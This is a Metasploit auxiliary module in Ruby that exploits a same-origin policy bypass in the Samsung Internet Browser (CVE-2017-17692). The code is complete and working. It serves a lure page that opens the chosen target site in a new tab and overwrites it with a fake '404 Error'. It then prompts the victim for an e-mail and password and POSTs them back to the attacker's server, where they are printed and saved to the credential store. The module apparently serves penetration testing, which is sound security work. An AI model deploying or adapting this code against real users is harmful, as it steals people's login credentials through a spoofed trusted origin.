# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => &#039;Samsung Internet Browser SOP Bypass&#039;,
        &#039;Description&#039;    => %q(
          This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the
          Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices.
          By default, it initiates a redirect to a child tab, and rewrites the innerHTML to gather
          credentials via a fake pop-up.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [
          &#039;Dhiraj Mishra&#039;, # Original discovery, disclosure
          &#039;Tod Beardsley&#039;, # Metasploit module
          &#039;Jeffrey Martin&#039; # Metasploit module
        ],
        &#039;References&#039;     => [
        [ &#039;CVE&#039;, &#039;2017-17692&#039; ],
        [&#039;URL&#039;, &#039;http://fr.0day.today/exploit/description/28434&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;Nov 08 2017&#039;,
        &#039;Actions&#039;        => [[ &#039;WebServer&#039; ]],
        &#039;PassiveActions&#039; => [ &#039;WebServer&#039; ],
        &#039;DefaultAction&#039;  => &#039;WebServer&#039;
      )
    )
 
  register_options([
      OptString.new(&#039;TARGET_URL&#039;, [
        true,
        &#039;The URL to spoof origin from.&#039;,
        &#039;http://example.com/&#039;
      ]),
      OptString.new(&#039;CUSTOM_HTML&#039;, [
        true,
        &#039;HTML to display to the victim.&#039;,
        &#039;This page has moved. Please <a href="#">click here</a> to redirect your browser.&#039;
      ])
    ])
 
  register_advanced_options([
    OptString.new(&#039;CUSTOM_JS&#039;, [
      false,
      "Custom Javascript to inject as the go() function. Use the variable &#039;x&#039; to refer to the new tab.",
      &#039;&#039;
    ])
  ])
 
  end
 
  def run
    exploit # start http server
  end
 
  def evil_javascript
    return datastore[&#039;CUSTOM_JS&#039;] unless datastore[&#039;CUSTOM_JS&#039;].blank?
    js = <<-EOS
      setTimeout(function(){
        x.document.body.innerHTML=&#039;<h1>404 Error</h1>&#039;+
        &#039;<p>Oops, something went wrong.</p>&#039;;
        a=x.prompt(&#039;E-mail&#039;,&#039;&#039;);
        b=x.prompt(&#039;Password&#039;,&#039;&#039;);
        var cred=JSON.stringify({&#039;user&#039;:a,&#039;pass&#039;:b});
        var xmlhttp = new XMLHttpRequest;
          xmlhttp.open(&#039;POST&#039;, window.location, true);
          xmlhttp.send(cred);
        }, 3000);
    EOS
    js
  end
 
  def setup
    @html = <<-EOS
        <html>
        <meta charset="UTF-8">
        <head>
        <script>
        function go(){
          try {
            var x = window.open(&#039;#{datastore[&#039;TARGET_URL&#039;]}&#039;);
            #{evil_javascript}
            } catch(e) { }
          }
        </script>
        </head>
        <body onclick="go()">
        #{datastore[&#039;CUSTOM_HTML&#039;]}
        </body></html>
      EOS
  end
 
  def store_cred(username,password)
    credential_data = {
      origin_type: :import,
      module_fullname: self.fullname,
      filename: &#039;msfconsole&#039;,
      workspace_id: myworkspace_id,
      service_name: &#039;web_service&#039;,
      realm_value: datastore[&#039;TARGET_URL&#039;],
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      private_type: :password,
      private_data: password,
      username: username
    }
    create_credential(credential_data)
  end
 
  # This assumes the default schema is being used.
  # If it&#039;s not that, it&#039;ll just display the collected POST data.
  def collect_data(request)
    cred = JSON.parse(request.body)
    u = cred[&#039;user&#039;]
    p = cred[&#039;pass&#039;]
    if u.blank? || p.blank?
      print_good("#{cli.peerhost}: POST data received from #{datastore[&#039;TARGET_URL&#039;]}: #{request.body}")
    else
      print_good("#{cli.peerhost}: Collected credential for &#039;#{datastore[&#039;TARGET_URL&#039;]}&#039; #{u}:#{p}")
      store_cred(u,p)
    end
  end
 
  def on_request_uri(cli, request)
    case request.method.downcase
    when &#039;get&#039; # initial connection
      print_status("#{cli.peerhost}: Request &#039;#{request.method} #{request.uri}&#039;")
      print_status("#{cli.peerhost}: Attempting to spoof origin for #{datastore[&#039;TARGET_URL&#039;]}")
      send_response(cli, @html)
    when &#039;post&#039; # must have fallen for it
      collect_data(request)
    else
      print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
    end
  end
 
end

